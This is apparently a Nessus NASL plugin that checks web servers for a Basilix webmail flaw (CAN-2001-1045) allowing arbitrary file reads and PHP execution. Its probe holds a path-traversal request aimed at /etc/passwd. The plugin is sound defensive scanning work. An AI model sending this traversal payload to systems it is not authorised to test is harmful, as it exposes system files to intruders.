#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GPL
#
# References:
# From: "karol _" <su@poczta.arena.pl>
# To: bugtraq@securityfocus.com
# CC: arslanm@Bilkent.EDU.TR
# Date: Fri, 06 Jul 2001 21:04:55 +0200
# Subject: basilix bug
#


if(description)
{
 script_id(11072);
 script_version ("$Revision: 1.5 $");
 script_cve_id("CAN-2001-1045");
 script_bugtraq_id(2995);
 name["english"] = "Basilix webmail dummy request vulnerability";
 script_name(english:name["english"]);

 desc["english"] = "
basilix.php3 is installed on this web server. Some versions
of this webmail software allow the users to read any file on 
the system with the permission of the webmail software, and 
execute any PHP.

Solution : Update Basilix or remove DUMMY from lang.inc

Risk factor : Low";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of basilix.php3";
 summary["francais"] = "Vérifie la présence de basilix.php3";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO); 

 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);

 script_dependencie("find_service.nes", "no404.nasl", "httpver.nasl", "logins.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# The script code starts here

port = get_kb_item("Services/www");
if (! port) port = 80;
if (! get_port_state(port)) exit(0);

#soc = http_open_socket(port);
#if (! soc) exit(0);

user = get_kb_item("http/login");
pass = get_kb_item("http/password");
if (! user) user="blah";
if (! pass) pass="blah";

url=string("/basilix.php3?request_id[DUMMY]=../../../../etc/passwd&RequestID=DUMMY&username=", user, "&password=", pass);
if(is_cgi_installed(port:port, item:url)){ security_hole(port); exit(0); }
